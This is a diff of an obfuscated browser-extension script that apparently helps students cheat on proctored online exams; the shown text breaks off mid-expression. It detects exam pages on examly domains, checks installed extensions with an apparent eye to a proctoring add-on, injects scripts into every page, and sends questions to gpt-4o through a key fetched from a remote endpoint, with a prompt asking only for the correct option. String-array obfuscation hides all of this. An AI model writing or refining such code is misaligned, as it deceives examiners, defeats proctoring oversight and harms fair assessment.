-    "VNGej",
-    "json",
-    "dNPJm",
-    "OQlcq",
-    "ryBDH",
-    "You are a ",
-    "QiKWS",
-    "No need an",
-    "test?id=",
-    "WtIZj",
-    "fIdhq",
-    "LkMJy",
-    "n>. If you",
-    "qvMUP",
-    "pUmIP",
-    "TQydj",
-    "PetQO",
-    "pboXP",
-    "mxyPM",
+    "mycourses/",
+    "lastError",
+    "3906456TPSEwv",
+    "some",
+    "616363Rjwpda",
+    "GBchh",
+    "tZERJ",
+    "esolve?nam",
+    "name",
+    ". Receivin",
+    "examly.net",
+    "ODwfA",
+    "ZtprT",
+    "s.google/r",
+    "data",
     "34.233.30.",
-    "QbSkR",
-    "Olrcm",
-    "pLVeQ",
-    "pFHWn",
-    "ext/apiEnd",
-    "OIENT",
-    "onActivate",
+    "2337144FBpXAj",
+    "getAll",
+    "examly.io",
+    "mycdetails",
+    "getUrlAndE",
+    "SbASP",
+    "create",
+    "xtensionDa",
+    "681570xLGYKp",
+    "fetch IP a",
+    "NeoExamShi",
+    "126zLgkqG",
+    "catch",
+    "extension",
+    "kClzP",
+    "DXttS",
+    "PIwzm",
     "Answer",
-    "hLkFJ",
-    "BYRSm",
-    "FMvjx",
-    "OkKTe",
-    "oilyA",
+    "142.250.19",
+    "/test-comp",
+    "YwOEK",
+    "130Xjivaz",
+    "update",
+    "3.147",
+    "management",
+    "connection",
+    "63715cvGdDY",
+    "ddress",
+    "qHSpE",
+    "?c_id=",
+    "Could not ",
+    "https://dn",
+    "35.212.92.",
+    "includes",
+    "enabled",
+    "test?id=",
+    "QpbRj",
+    "atibility",
+    "g end does",
+    "221",
+    "yflit",
+    "json",
+    "filter",
+    "Failed to ",
+    "Gllep",
+    "runtime",
+    "2157084OURcsV",
+    "establish ",
+    "hostname",
+    "1vqdsxa",
+    "find",
+    "type",
+    "2345067VMluBn",
+    "details?id",
+    "then",
+    "196",
+    "message",
+    "eld",
   ];
-  return (_0x3a1b = function () {
-    return t;
+  return (_0xf5f6 = function () {
+    return e;
   })();
 }
-let isReloading = !1;
-function fetchExtensionDetails(t) {
-  const e = _0x3bb684,
-    n = {
-      YpRnc: function (t, e, n) {
-        return t(e, n);
-      },
-    };
-  chrome[e(505)][e(357)]((r) => {
-    const o = e,
-      c = r[o(323)]((t) => t[o(649)] && t[o(414)] === o(479) + o(533) && t[o(563)] === o(442)),
-      i = c[o(323)]((t) => t[o(649)] && t[o(414)] !== o(479) + o(533) && t[o(563)] === o(442))[
-        o(370)
-      ];
-    n[o(303)](t, c, i);
-  });
-}
-const fetchDomainIp = (t) => {
-  const e = {
-    mfwYi: function (t, e) {
-      return t(e);
-    },
-    ETtVS: function (t, e) {
-      return t(e);
-    },
-    tNtPb: function (t, e) {
-      return t(e);
-    },
-  };
-  return new Promise((n) => {
-    const r = _0x5cbc,
-      o = {
-        kfLbY: function (t, n) {
-          return e[_0x5cbc(524)](t, n);
-        },
-      },
-      c = new URL(t)[r(514)];
-    e[r(476)](fetch, r(329) + r(333) + r(472) + "e=" + c)
-      [r(239)]((t) => t[r(375)]())
-      [r(239)]((t) => {
-        const e = r,
-          c = t[e(401)][e(423)]((t) => 1 === t[e(563)])?.[e(443)] || null;
-        o[e(244)](n, c);
-      })
-      [r(430)](() => {
-        e[r(371)](n, null);
-      });
-  });
-};
+
 async function handleUrlChange() {
-  const t = _0x3bb684,
-    e = {
-      xZvop: function (t, e) {
-        return t === e;
+  const e = _0x28af84,
+    t = {
+      QpbRj: function (e, t) {
+        return e(t);
       },
-      hwaGC: t(481) + t(693) + t(545) + t(651) + t(611) + t(346) + ".",
-      uMHaE: t(536) + t(260) + "ta",
-      elsGt: function (t, e) {
-        return t(e);
+      ODwfA: function (e, t) {
+        return e === t;
       },
-      ZOulB: t(257),
-      zVJuK: t(349) + "t",
-      LqWjE: t(668),
-      nzRyF: function (t, e) {
-        return t(e);
+      kClzP: e(490) + e(507) + e(485) + e(535) + e(498) + e(523) + ".",
+      ZtprT: e(464) + e(467) + "ta",
+      GBchh: e(536),
+      SbASP: e(522) + "t",
+      YwOEK: e(462),
+      qHSpE: function (e, t) {
+        return e(t);
       },
-      Sapos: t(256) + t(473) + t(644),
+      yflit: e(503) + e(469) + e(487),
     };
-  if (urlPatterns[t(302)]((e) => tabDetails[t(311)][t(513)](e))) {
-    let n = await e[t(470)](fetchDomainIp, tabDetails[t(311)]);
-    (n && domain_ip_addresses[t(513)](n)) ||
-    tabDetails[t(311)][t(513)](e[t(686)]) ||
-    tabDetails[t(311)][t(513)](e[t(560)]) ||
-    tabDetails[t(311)][t(513)](e[t(293)])
-      ? e[t(497)](fetchExtensionDetails, (n, r) => {
-          const o = t,
-            c = {
-              DBggN: function (t, n) {
-                return e[_0x5cbc(218)](t, n);
-              },
-              GNUWC: e[o(447)],
-            };
-          let i = {
-            action: e[o(226)],
-            url: tabDetails[o(311)],
+  if (urlPatterns[e(529)]((t) => tabDetails[e(518)][e(493)](t))) {
+    var r = await ((n = tabDetails[e(518)]),
+    new Promise((r) => {
+      const o = e,
+        s = {
+          DXttS: function (e, n) {
+            return t[_0x41b7(496)](e, n);
+          },
+        },
+        a = new URL(n)[o(508)];
+      t[o(496)](fetch, o(491) + o(539) + o(533) + "e=" + a)
+        [o(514)]((e) => e[o(501)]())
+        [o(514)]((e) => {
+          const n = o,
+            s = e[n(477)][n(510)]((e) => 1 === e[n(511)])?.[n(540)] || null;
+          t[n(496)](r, s);
+        })
+        [o(472)](() => {
+          s[o(475)](r, null);
+        });
+    }));
+    (r && domain_ip_addresses[e(493)](r)) ||
+    tabDetails[e(518)][e(493)](t[e(531)]) ||
+    tabDetails[e(518)][e(493)](t[e(465)]) ||
+    tabDetails[e(518)][e(493)](t[e(480)])
+      ? t[e(488)](fetchExtensionDetails, (n, r) => {
+          const o = e;
+          var s = {
+            action: t[o(538)],
+            url: tabDetails[o(518)],
             enabledExtensionCount: r,
             extensions: n,
             id: tabDetails.id,
             currentKey: currentKey,
           };
-          chrome[o(438)][o(277) + "e"](tabDetails.id, i, (t) => {
-            const e = o;
-            chrome[e(424)][e(227)] &&
-              c[e(700)](chrome[e(424)][e(227)][e(543)], c[e(477)]) &&
-              chrome[e(438)][e(667)](tabDetails.id, { url: tabDetails[e(311)] });
+          browser[o(519)][o(520) + "e"](tabDetails.id, s, (e) => {
+            const n = o;
+            browser[n(505)][n(527)] &&
+              t[n(537)](t[n(474)], browser[n(505)][n(527)][n(516)]) &&
+              browser[n(519)][n(482)](tabDetails.id, { url: tabDetails[n(518)] });
           });
         })
-      : console[t(352)](e[t(469)]);
+      : console[e(521)](t[e(500)]);
   }
+  var n;
 }
-function _0x5cbc(t, e) {
-  const n = _0x3a1b();
-  return (_0x5cbc = function (t, e) {
-    return n[(t -= 217)];
-  })(t, e);
+function openNewMinimizedWindowWithUrl(e) {
+  const t = _0x28af84;
+  browser[t(519)][t(466)]({ url: e }, (e) => {});
 }
-function openNewMinimizedWindowWithUrl(t) {
-  const e = _0x3bb684;
-  chrome[e(438)][e(620)]({ url: t }, (t) => {});
+function _0x549d(e, t) {
+  const n = _0x41be();
+  return (_0x549d = function (e, t) {
+    return n[(e -= 122)];
+  })(e, t);
 }
-chrome[_0x3bb684(438)][_0x3bb684(400) + "d"][_0x3bb684(369) + "r"]((t) => {
-  const e = _0x3bb684;
-  chrome[e(438)][e(665)](t[e(298)], (t) => {
-    tabDetails = t;
-  });
-}),
-  chrome[_0x3bb684(438)][_0x3bb684(631)][_0x3bb684(369) + "r"]((t, e, n) => {
-    const r = _0x3bb684,
-      o = {
-        ODMMk: function (t, e) {
-          return t === e;
-        },
-        QCMeM: r(439),
-        nIOeg: function (t) {
-          return t();
-        },
-      };
-    o[r(669)](e[r(585)], o[r(412)]) && ((tabDetails = n), o[r(445)](handleUrlChange));
+const _0x12913c = _0x549d;
+function _0x41be() {
+  const e = [
+    "Blocker Re",
+    "url",
+    "t/isolated",
+    "mTmFj",
+    "document_s",
+    "registerCo",
+    " Failed",
+    "scripting",
+    "7EgtMVg",
+    "message re",
+    "GCXGQ",
+    "ContentScr",
+    "t/main.js",
+    "isolated",
+    "124PjlkBo",
+    "tabId",
+    "gistration",
+    "2684168USwkRc",
+    "KUXSG",
+    "main",
+    "ipts",
+    "1373055YdiPmU",
+    "onUpdated",
+    "actions",
+    "zQSdJ",
+    "tabs",
+    "VLkhO",
+    "10aBTPym",
+    "ZfuKy",
+    "tart",
+    "setTitle",
+    "TeHDM",
+    "setBadgeTe",
+    "uwGjY",
+    "addListene",
+    "runtime",
+    "*://*/*",
+    "13721SkpdMq",
+    "ceived",
+    " Failed: ",
+    "onActivate",
+    "get",
+    "TBhKz",
+    "cyKhO",
+    "ntentScrip",
+    "JLSMC",
+    "length",
+    ".js",
+    "unregister",
+    "key",
+    "KWadb",
+    "UNQcV",
+    "102NtqiBJ",
+    "ISOLATED",
+    "PnkFZ",
+    "log",
+    "data/injec",
+    "kyXSL",
+    "ysIiN",
+    "openNewTab",
+    "pageReload",
+    "CgeUO",
+    "error",
+    "YegdA",
+    "message",
+    "13261281ChBygR",
+    "fNRvu",
+    "query",
+    "inUAw",
+    "hPfmv",
+    "busy",
+    "windowFocu",
+    "3072078jLRyns",
+    "171015nLLEwk",
+    "onMessage",
+    "MAIN",
+    "compvare",
+    "ETeOn",
+    "status",
+    "4154553xGSmoY",
+    "sTfXJ",
+    "action",
+  ];
+  return (_0x41be = function () {
+    return e;
+  })();
+}
+(function (e, t) {
+  const n = _0x549d,
+    r = _0x41be();
+  for (;;)
+    try {
+      if (
+        714627 ===
+        (-parseInt(n(130)) / 1) * (parseInt(n(145)) / 2) +
+          parseInt(n(196)) / 3 +
+          (parseInt(n(189)) / 4) * (parseInt(n(166)) / 5) +
+          -parseInt(n(165)) / 6 +
+          (parseInt(n(183)) / 7) * (-parseInt(n(192)) / 8) +
+          (-parseInt(n(172)) / 9) * (parseInt(n(202)) / 10) +
+          parseInt(n(158)) / 11
+      )
+        break;
+      r.push(r.shift());
+    } catch (e) {
+      r.push(r.shift());
+    }
+})(),
+  browser[_0x12913c(200)][_0x12913c(133) + "d"][_0x12913c(127) + "r"]((e) => {
+    const t = _0x12913c;
+    browser[t(200)][t(134)](e[t(190)], (e) => {
+      tabDetails = e;
+    });
   }),
-  chrome[_0x3bb684(424)][_0x3bb684(597)][_0x3bb684(369) + "r"]((t, e, n) => {
-    const r = _0x3bb684,
+  browser[_0x12913c(200)][_0x12913c(197)][_0x12913c(127) + "r"]((e, t, n) => {
+    const r = _0x12913c,
       o = {
-        GFWmO: r(594) + r(328),
-        CUQGr: function (t, e) {
-          return t === e;
+        ZfuKy: function (e, t) {
+          return e === t;
         },
-        NTsjZ: r(488) + "ed",
-        gImka: r(339) + "s",
-        RkLzz: function (t) {
-          return t();
-        },
-        wHhXf: function (t, e) {
-          return t === e;
-        },
-        JDwyJ: r(511),
-        PmdTk: function (t, e) {
-          return t(e);
+        hPfmv: r(169),
+        inUAw: function (e) {
+          return e();
         },
       };
-    console[r(352)](o[r(309)], t),
-      (currentKey = t[r(483)]),
-      o[r(598)](t[r(262)], o[r(334)]) || o[r(598)](t[r(262)], o[r(336)])
-        ? o[r(624)](handleUrlChange)
-        : o[r(670)](t[r(262)], o[r(558)]) && o[r(554)](openNewMinimizedWindowWithUrl, t[r(311)]);
+    o[r(203)](o[r(162)], t[r(171)]) && ((tabDetails = n), o[r(161)](handleUrlChange));
+  }),
+  browser[_0x12913c(128)][_0x12913c(167)][_0x12913c(127) + "r"]((e, t, n) => {
+    const r = _0x12913c,
+      o = {
+        cyKhO: r(184) + r(131),
+        UNQcV: function (e, t) {
+          return e === t;
+        },
+        PnkFZ: r(153) + "ed",
+        ysIiN: r(164) + "s",
+        JLSMC: function (e) {
+          return e();
+        },
+        KWadb: r(152),
+        KUXSG: function (e, t) {
+          return e(t);
+        },
+      };
+    console[r(148)](o[r(136)], e),
+      (currentKey = e[r(142)]),
+      o[r(144)](o[r(147)], e[r(174)]) || o[r(144)](o[r(151)], e[r(174)])
+        ? o[r(138)](handleUrlChange)
+        : o[r(144)](o[r(143)], e[r(174)]) && o[r(193)](openNewMinimizedWindowWithUrl, e[r(176)]);
   });
-const notify = async (t, e, n = "E") => {
-    const r = _0x3bb684;
-    (t = t || (await chrome[r(438)][r(415)]({ active: !0, lastFocusedWindow: !0 }))[0].id),
-      chrome[r(262)][r(300) + "xt"]({ tabId: t, text: n }),
-      chrome[r(262)][r(555)]({ tabId: t, title: e });
+const notify = async (e, t, n = "E") => {
+    const r = _0x12913c;
+    (e = e || (await browser[r(200)][r(160)]({ active: !0, lastFocusedWindow: !0 }))[0].id),
+      browser[r(174)][r(125) + "xt"]({ tabId: e, text: n }),
+      browser[r(174)][r(123)]({ tabId: e, title: t });
   },
   activate = () => {
-    const t = _0x3bb684,
-      e = {
-        ryBDH: t(588) + t(683),
-        oVSdY: t(368),
-        idbKO: t(486),
-        pDyGT: t(596),
-        kscrl: t(621) + t(689),
-        XWLYQ: t(455),
-        GPZlS: t(258),
-        BZIxz: t(621) + t(340) + t(468),
-        OQlcq: t(408),
-        mUQSz: function (t, e, n) {
-          return t(e, n);
+    const e = _0x12913c,
+      t = {
+        YegdA: e(179) + e(122),
+        sTfXJ: e(129),
+        uwGjY: e(194),
+        mTmFj: e(149) + e(187),
+        zQSdJ: e(168),
+        TBhKz: e(188),
+        fNRvu: e(149) + e(177) + e(140),
+        ETeOn: e(146),
+        VLkhO: function (e, t, n) {
+          return e(t, n);
         },
-        lqseA: function (t, e) {
-          return t + e;
+        GCXGQ: function (e, t) {
+          return e + t;
         },
-        dNdhv: t(601) + t(506) + t(372),
-        JnIgQ: t(601) + t(506) + t(587),
-        wxHGX: function (t) {
-          return t();
+        CgeUO: e(175) + e(191) + e(132),
+        TeHDM: e(175) + e(191) + e(181),
+        kyXSL: function (e) {
+          return e();
         },
       };
-    if (activate[t(642)]) return;
-    activate[t(642)] = !0;
-    try {
-      chrome[t(279)][t(290) + t(575) + t(550)]();
-      const n = { allFrames: !0, matchOriginAsFallback: !0, runAt: e[t(378)] };
-      (n[e[t(516)]] = [e[t(228)]]),
-        chrome[t(279)][t(580) + t(607) + "ts"]([
-          { ...n, id: e[t(629)], js: [e[t(475)]], world: e[t(264)] },
-          { ...n, id: e[t(268)], js: [e[t(672)]], world: e[t(377)] },
+    if (!activate[e(163)]) {
+      activate[e(163)] = !0;
+      try {
+        browser[e(182)][e(141) + e(186) + e(195)]();
+        const n = {
+          allFrames: !0,
+          matchOriginAsFallback: !0,
+          runAt: t[e(156)],
+          matches: [t[e(173)]],
+        };
+        browser[e(182)][e(180) + e(137) + "ts"]([
+          { ...n, id: t[e(126)], js: [t[e(178)]], world: t[e(199)] },
+          { ...n, id: t[e(135)], js: [t[e(159)]], world: t[e(170)] },
         ]);
-    } catch (n) {
-      e[t(567)](notify, void 0, e[t(299)](e[t(219)], n[t(543)])), console[t(355)](e[t(413)], n);
+      } catch (n) {
+        t[e(201)](notify, void 0, t[e(185)](t[e(154)], n[e(157)])), console[e(155)](t[e(124)], n);
+      }
+      for (const n of activate[e(198)]) t[e(150)](n);
+      (activate[e(198)][e(139)] = 0), (activate[e(163)] = !1);
     }
-    for (const n of activate[t(522)]) e[t(306)](n);
-    (activate[t(522)][t(370)] = 0), (activate[t(642)] = !1);
   };
-async function processChatMessage(t) {
-  const e = _0x3bb684,
-    n = {
-      msRiS: e(364),
-      MClKy: e(625),
-      AvuNt: e(566) + e(220),
-      uzWAK: e(359),
-      vSJzH: function (t, e, n, r) {
-        return t(e, n, r);
-      },
-    },
-    r = await n[e(286)](queryOpenAI, t, !1, chatContext);
-  r &&
-    (chatContext[e(353)]({ role: n[e(273)], content: r }),
-    chrome[e(438)][e(415)]({ active: !0, currentWindow: !0 }, (t) => {
-      const o = e,
-        c = t[0];
-      (c[o(311)][o(429)](n[o(658)]) || c[o(311)][o(429)](n[o(448)])) &&
-        chrome[o(438)][o(277) + "e"](c.id, { action: n[o(435)], role: n[o(273)], content: r });
+async function processChatMessage(e) {
+  const t = await queryOpenAI(e, !1, chatContext);
+  t &&
+    (chatContext.push({ role: "assistant", content: t }),
+    browser.tabs.query({ active: !0, currentWindow: !0 }, (e) => {
+      const n = e[0];
+      (n.url.startsWith("http://") || n.url.startsWith("https://")) &&
+        browser.tabs.sendMessage(n.id, {
+          action: "updateChatHistory",
+          role: "assistant",
+          content: t,
+        });
     }));
 }
-function _0x5e8e(t, e) {
-  const n = _0x3bb684,
-    r = {
-      KXcCh: function (t, e) {
-        return t - e;
-      },
-      EYHXO: function (t, e) {
-        return t + e;
-      },
-      RSfjT: function (t, e) {
-        return t * e;
-      },
-      vHanO: function (t) {
-        return t();
-      },
-      ysRcE: function (t, e, n) {
-        return t(e, n);
-      },
-    },
-    o = r[n(503)](_0x2732);
-  return (
-    (_0x5e8e = function (t, e) {
-      const c = n;
-      return (t = r[c(661)](t, r[c(289)](r[c(289)](5690, r[c(301)](-3017, 2)), 643))), o[t];
-    }),
-    r[n(676)](_0x5e8e, t, e)
-  );
+function _0xfcfe(e, t) {
+  const n = _0x5cd2();
+  return (_0xfcfe = function (e, t) {
+    return n[(e -= 241)];
+  })(e, t);
 }
-async function queryOpenAI(t, e = !1, n = []) {
-  const r = _0x3bb684,
+function _0x5cd2() {
+  const e = [
+    "ld be in t",
+    "n>. If you",
+    "6808756pUbzYR",
+    "is not an ",
+    "No need an",
+    "https://th",
+    "applicatio",
+    "ottathukid",
+    "ption numb",
+    "json",
+    "y explanat",
+    "helpful as",
+    "error",
+    "message",
+    "sTrTJ",
+    "ihati",
+    "You are a ",
+    "Exception ",
+    "while quer",
+    "gsmpn",
+    "508146XjFkHf",
+    "ion, Just ",
+    "er and the",
+    "swer optio",
+    "MCQ, just ",
+    "on alone. ",
+    "utput shou",
+    "n/json",
+    "point",
+    " no.>. <an",
+    " question ",
+    "voplF",
+    "131AeAaOf",
+    "isArray",
+    "JwYmW",
+    "stringify",
+    "WChHK",
+    "qsruW",
+    "ext/apiEnd",
+    "ying OpenA",
+    "5qjyZbh",
+    "key",
+    "KPcnj",
+    "iRhBL",
+    "l.app/api/",
+    " correct a",
+    " : <option",
+    "OpenAI res",
+    "log",
+    "nswer opti",
+    "trim",
+    "his format",
+    "Error quer",
+    "XRRPC",
+    "ponse:",
+    "Bearer ",
+    "4737825gGEdmw",
+    "only say `",
+    "oUHTh",
+    " MCQ quest",
+    "uven.verce",
+    "ion. The o",
+    "gpt-4o",
+    "\nThis is a",
+    "OBvHm",
+    "POST",
+    "22234ZGxmWK",
+    "lFsns",
+    "256869IUChfq",
+    "choices",
+    "11682797xKrUXI",
+    "give the o",
+    "296ofDqtL",
+    "content",
+    "endpoint",
+    "53189840gWqMcC",
+    "oaKVz",
+    "sistant.",
+    "Not an MCQ",
+    " think the",
+    "system",
+    "user",
+  ];
+  return (_0x5cd2 = function () {
+    return e;
+  })();
+}
+async function queryOpenAI(e, t = !1, n = []) {
+  const r = _0xfcfe,
     o = {
-      OjFGb: function (t) {
-        return t();
-      },
-      eSVnJ: function (t, e) {
-        return t == e;
-      },
-      XjLFi: function (t, e, n) {
-        return t(e, n);
-      },
-      oWAQL: function (t, e, n) {
-        return t(e, n);
-      },
-      hOCTK: function (t, e) {
-        return t + e;
-      },
-      XTQvu: function (t, e) {
-        return t + e;
-      },
-      NWsmj: function (t, e) {
-        return t + e;
-      },
-      Dxuvs: function (t, e) {
-        return t(e);
-      },
-      WibfU: function (t, e) {
-        return t(e);
-      },
-      YYXaw: function (t, e) {
-        return t(e);
-      },
-      gAdMC: function (t, e) {
-        return t(e);
-      },
-      ytNZJ: function (t, e) {
-        return t(e);
-      },
-      Honoz: function (t, e) {
-        return t + e;
-      },
-      FczhE: function (t, e) {
-        return t + e;
-      },
-      AlSjt: function (t, e) {
-        return t + e;
-      },
-      HKDpb: function (t, e) {
-        return t + e;
-      },
-      MNYPI: function (t, e) {
-        return t + e;
-      },
-      IfBJh: function (t, e) {
-        return t + e;
-      },
-      zIFtA: function (t, e) {
-        return t + e;
-      },
-      EwFjG: function (t, e) {
-        return t + e;
-      },
-      PTZCs: function (t, e) {
-        return t + e;
-      },
-      BSvlo: function (t, e) {
-        return t + e;
-      },
-      DxoQX: function (t, e) {
-        return t + e;
-      },
-      hJOcY: function (t, e) {
-        return t(e);
-      },
-      AbNMP: function (t, e) {
-        return t(e);
-      },
-      FMvjx: function (t, e) {
-        return t(e);
-      },
-      IAUTn: function (t, e) {
-        return t(e);
-      },
-      oilyA: function (t, e) {
-        return t(e);
-      },
-      mxyPM: function (t, e) {
-        return t(e);
-      },
-      VNGej: function (t, e) {
-        return t(e);
-      },
-      Qcyaq: function (t, e) {
-        return t(e);
-      },
-      sZUWM: function (t, e) {
-        return t(e);
-      },
-      iNFzh: function (t, e) {
-        return t(e);
-      },
-      MHzrq: function (t, e) {
-        return t(e);
-      },
-      RTXTv: function (t, e) {
-        return t(e);
-      },
-      jxuhN: function (t, e) {
-        return t(e);
-      },
-      OIENT: function (t, e) {
-        return t + e;
-      },
-      GXqBV: function (t, e) {
-        return t(e);
-      },
-      jbqZj: function (t, e) {
-        return t(e);
-      },
-      UyOcU: function (t, e) {
-        return t(e);
-      },
-      simQN: function (t, e) {
-        return t + e;
-      },
-      cDcBR: function (t, e) {
-        return t + e;
-      },
-      TuRBf: function (t, e) {
-        return t(e);
-      },
-      CsEqY: function (t, e) {
-        return t + e;
-      },
-      ZNfxa: function (t, e) {
-        return t + e;
-      },
-      LkMJy: function (t, e) {
-        return t(e);
-      },
-      pboXP: function (t, e) {
-        return t(e);
-      },
-      eMPcV: function (t, e) {
-        return t(e);
-      },
-      pFHWn: function (t, e) {
-        return t(e);
-      },
-      HiKjz: function (t, e) {
-        return t(e);
-      },
-      jxgkA: function (t, e) {
-        return t(e);
-      },
-      qhlgY: function (t, e) {
-        return t(e);
-      },
-      FCYAd: function (t, e) {
-        return t(e);
-      },
-      rgWph: function (t, e) {
-        return t(e);
-      },
-      UbiFC: function (t, e) {
-        return t(e);
-      },
-      nbDIW: function (t, e) {
-        return t + e;
-      },
-      DZtiH: function (t, e) {
-        return t(e);
-      },
-      mazGe: function (t, e) {
-        return t(e);
-      },
-      sbhDJ: function (t, e) {
-        return t(e);
-      },
-      PFjXD: function (t, e) {
-        return t(e);
-      },
-      wdAFV: function (t, e) {
-        return t(e);
-      },
-      mospG: function (t, e) {
-        return t(e);
-      },
-      lPkHy: function (t, e) {
-        return t * e;
-      },
-      FDUDh: function (t, e) {
-        return t(e);
-      },
-      zkPvk: function (t, e) {
-        return t * e;
-      },
-      upSEW: function (t, e) {
-        return t(e);
-      },
-      goirk: function (t, e) {
-        return t + e;
-      },
-      POpoS: function (t, e) {
-        return t(e);
-      },
-      ATxcu: function (t, e) {
-        return t(e);
-      },
-      chmAn: function (t, e) {
-        return t(e);
-      },
-    },
-    c = _0x5e8e,
-    i = {
-      pYDeX: function (t) {
-        return o[_0x5cbc(436)](t);
-      },
-      xIXfD: function (t, e) {
-        return o[_0x5cbc(561)](t, e);
-      },
-      ApNey: function (t, e, n) {
-        return o[_0x5cbc(496)](t, e, n);
-      },
-      AgLHZ: o[r(313)](
-        o[r(231)](
-          o[r(313)](
-            o[r(671)](o[r(313)](o[r(675)](c, 348), o[r(610)](c, 329)), o[r(675)](c, 313)),
-            o[r(675)](c, 345)
-          ),
-          o[r(675)](c, 338)
-        ),
-        o[r(600)](c, 306)
-      ),
-      qvMUP: o[r(230)](c, 377),
-      Aojek: o[r(313)](o[r(600)](c, 355), o[r(641)](c, 382)),
-      mQDMG: o[r(501)](
-        o[r(313)](
-          o[r(501)](
-            o[r(628)](
-              o[r(679)](
-                o[r(572)](
-                  o[r(628)](
-                    o[r(231)](
-                      o[r(464)](
-                        o[r(645)](
-                          o[r(231)](
-                            o[r(645)](
-                              o[r(572)](
-                                o[r(288)](
-                                  o[r(628)](
-                                    o[r(420)](
-                                      o[r(462)](
-                                        o[r(572)](
-                                          o[r(572)](
-                                            o[r(288)](
-                                              o[r(433)](
-                                                o[r(628)](
-                                                  o[r(679)](
-                                                    o[r(628)](
-                                                      o[r(613)](
-                                                        o[r(641)](c, 307),
-                                                        o[r(641)](c, 299)
-                                                      ),
-                                                      o[r(603)](c, 342)
-                                                    ),
-                                                    o[r(316)](c, 351)
-                                                  ),
-                                                  o[r(316)](c, 312)
-                                                ),
-                                                o[r(610)](c, 331)
-                                              ),
-                                              o[r(600)](c, 359)
-                                            ),
-                                            o[r(404)](c, 362)
-                                          ),
-                                          o[r(431)](c, 352)
-                                        ),
-                                        o[r(431)](c, 341)
-                                      ),
-                                      o[r(610)](c, 337)
-                                    ),
-                                    o[r(406)](c, 316)
-                                  ),
-                                  o[r(392)](c, 309)
-                                ),
-                                o[r(392)](c, 310)
-                              ),
-                              o[r(404)](c, 311)
-                            ),
-                            o[r(374)](c, 356)
-                          ),
-                          o[r(325)](c, 334)
-                        ),
-                        o[r(431)](c, 303)
-                      ),
-                      o[r(335)](c, 330)
-                    ),
-                    o[r(509)](c, 304)
-                  ),
-                  o[r(335)](c, 361)
-                ),
-                o[r(351)](c, 317)
-              ),
-              o[r(698)](c, 339)
-            ),
-            o[r(431)](c, 354)
-          ),
-          o[r(610)](c, 367)
-        ),
-        "`."
-      ),
-      mEDVG: o[r(275)](c, 374),
-      FCBFK: o[r(464)](o[r(399)](o[r(275)](c, 336), o[r(570)](c, 324)), o[r(600)](c, 333)),
-      oBdEI: o[r(281)](c, 360),
-      Afhgk: function (t, e, n) {
-        return o[r(640)](t, e, n);
-      },
-      PcqPw: o[r(571)](c, 326),
-      mjCqu: o[r(433)](o[r(698)](c, 328), o[r(603)](c, 301)),
-      yFVUg: o[r(619)](o[r(322)](o[r(600)](c, 380), o[r(285)](c, 332)), "I:"),
-      boYrd: o[r(616)](
-        o[r(308)](o[r(308)](o[r(385)](c, 346), o[r(610)](c, 343)), o[r(391)](c, 332)),
-        "I:"
-      ),
+      KPcnj: function (e) {
+        return e();
+      },
+      oaKVz: function (e, t) {
+        return e == t;
+      },
+      lFsns: function (e, t, n) {
+        return e(t, n);
+      },
+      ihati: r(309) + r(311) + r(282) + r(266) + r(260) + r(250),
+      JwYmW: r(287),
+      WChHK: r(310) + r(249),
+      qsruW:
+        r(285) +
+        r(281) +
+        r(243) +
+        r(293) +
+        r(312) +
+        r(244) +
+        r(267) +
+        r(271) +
+        r(247) +
+        r(308) +
+        r(314) +
+        r(283) +
+        r(248) +
+        r(304) +
+        r(273) +
+        r(268) +
+        r(251) +
+        r(245) +
+        r(305) +
+        r(301) +
+        r(252) +
+        r(307) +
+        r(246) +
+        r(279) +
+        r(300) +
+        "`.",
+      oUHTh: r(302),
+      gsmpn: r(320) + r(315) + r(299),
+      iRhBL: r(303),
+      OBvHm: r(284),
+      voplF: r(269) + r(276),
+      sTrTJ: r(274) + r(261) + "I:",
+      XRRPC: r(321) + r(322) + r(261) + "I:",
     };
-  var a = await i[o[r(491)](c, 318)](getCredentials);
-  if (!a || i[o[r(397)](c, 300)](a, void 0)) return;
-  const u = await i[o[r(351)](c, 373)](fetch, i[o[r(431)](c, 349)], {
-      method: i[o[r(316)](c, 371)],
-      headers: {
-        "Content-Type": i[o[r(673)](c, 353)],
-        Authorization: o[r(308)](o[r(673)](c, 379), a),
-      },
-      body: JSON[o[r(509)](c, 357)]({}),
+  var s = await o[r(264)](getCredentials);
+  if (!s || o[r(298)](null, s)) return;
+  const a = await o[r(289)](fetch, o[r(319)], {
+      method: o[r(256)],
+      headers: { "Content-Type": o[r(258)], Authorization: r(277) + s },
+      body: JSON[r(257)]({}),
     }),
-    s = await u[o[r(504)](c, 340)]();
-  console[o[r(638)](c, 369)](s);
-  const d = s[o[r(426)](c, 322)],
-    l = s[o[r(335)](c, 327)];
-  e && (t += i[o[r(330)](c, 372)]);
-  const p = [
-    { role: i[o[r(404)](c, 308)], content: i[o[r(385)](c, 381)] },
-    ...(Array[o[r(385)](c, 305)](n) ? n : []),
-    { role: i[o[r(426)](c, 358)], content: t },
+    i = await a[r(313)]();
+  console[r(270)](i);
+  const c = i[r(296)],
+    l = i[r(263)];
+  t && (e += o[r(259)]);
+  const d = [
+    { role: o[r(280)], content: o[r(241)] },
+    ...(Array[r(255)](n) ? n : []),
+    { role: o[r(265)], content: e },
   ];
   try {
-    const t = await i[o[r(276)](c, 335)](fetch, d, {
-      method: i[o[r(509)](c, 371)],
-      headers: { Authorization: o[r(250)]("", l), "Content-Type": i[o[r(491)](c, 353)] },
-      body: JSON[o[r(335)](c, 357)]({ model: i[o[r(618)](c, 363)], messages: p }),
+    const e = await o[r(289)](fetch, c, {
+      method: o[r(256)],
+      headers: { Authorization: "" + l, "Content-Type": o[r(258)] },
+      body: JSON[r(257)]({ model: o[r(286)], messages: d }),
     });
-    if (!t.ok) {
-      console[o[r(318)](c, 369)](i[o[r(517)](c, 314)], t);
-      const e = await t[o[r(426)](c, 340)]();
-      return console[o[r(509)](c, 315)](i[o[r(571)](c, 347)], e), null;
+    if (!e.ok) {
+      console[r(270)](o[r(253)], e);
+      const t = await e[r(313)]();
+      return console[r(316)](o[r(318)], t), null;
     }
-    console[o[r(335)](c, 369)](i[o[r(234)](c, 314)], t);
-    const e = await t[o[r(552)](c, 340)]();
+    console[r(270)](o[r(253)], e);
+    const t = await e[r(313)]();
     return (
-      e[o[r(316)](c, 364)] &&
-      e[o[r(271)](c, 364)][o[r(619)](o[r(501)](-488, o[r(366)](-3833, 1)), 4321)] &&
-      e[o[r(419)](c, 364)][o[r(671)](o[r(399)](o[r(366)](-1, -9283), 512), o[r(296)](9795, -1))][
-        o[r(407)](c, 344)
-      ] &&
